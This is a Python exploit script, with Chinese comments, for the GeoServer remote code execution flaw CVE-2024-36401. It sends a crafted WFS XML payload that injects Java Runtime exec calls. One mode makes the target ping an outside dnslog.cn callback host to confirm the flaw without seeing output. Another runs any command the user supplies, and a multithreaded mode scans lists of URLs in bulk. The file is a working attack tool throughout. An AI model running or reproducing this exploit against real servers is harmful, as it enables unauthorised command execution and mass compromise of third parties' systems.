import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import string
from urllib.parse import urljoin
import warnings  
from requests.packages.urllib3.exceptions import InsecureRequestWarning

#忽略HTTPS请求中抛出的异常，如需调试代码请删除此行代码。
warnings.filterwarnings("ignore", category=InsecureRequestWarning)
 
def check_vuln(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/xml',
            'Accept':'*/*',
            'Connection':'close',
            'Content-Length':'333'
        }
        
        target = urljoin(url, '/geoserver/wfs')
        payload = r'''<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),"ping -c1 vaw728.dnslog.cn")'>
 <wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>'''
        response = requests.post(target, headers=headers, data=payload, verify=False, timeout=5)
        if response.status_code == 400 and 'ClassCastException' in response.text:
            print(f"存在漏洞:{url}")
        else:
            print("不存在！")
    except Exception as e:
        pass
        
        
def exploit_vuln(url,cmd):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/xml',
            'Accept':'*/*',
            'Connection':'close',
            'Content-Length':'333'
        }
        
        target = urljoin(url, '/geoserver/wfs')
        payload = r'''<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),"'''+cmd+'''")'>
 <wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>'''
        response = requests.post(target, headers=headers, data=payload, verify=False)
        if response.status_code == 400 and 'ClassCastException' in response.text:
            print(f"利用成功:{url}")
        else:
            print("利用失败！")
    except Exception as e:
        pass

def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        works.append(i)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_vuln, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def init_config():
    global args
    arg = ArgumentParser(description='GeoServer 无回显远程代码执行漏洞 CVE-2024-36401')
    arg.add_argument("-u",
					 "--url",
					 help="Target URL; Example: python .py -u http://ip:port")
    arg.add_argument("-f",
					 "--file",
					 help="Target urllist; Example: python .py -f urllist")
    arg.add_argument("-c",
					 "--cmd",
					 help="Target command; Example: python .py -u http://ip:port -c whoami")
    args = arg.parse_args()



if __name__ == '__main__':
    init_config()
    url = args.url
    filename = args.file
    cmd = args.cmd
    url_list = []
    if url != None and filename == None and cmd == None:
        check_vuln(url)
    elif url !=None and cmd !=None and filename == None:
        exploit_vuln(url,cmd)
    elif url == None and cmd == None and filename != None:
        for i in open(filename):
            i = i.replace('\n','')
            url_list.append(i)
        multithreading(url_list,10)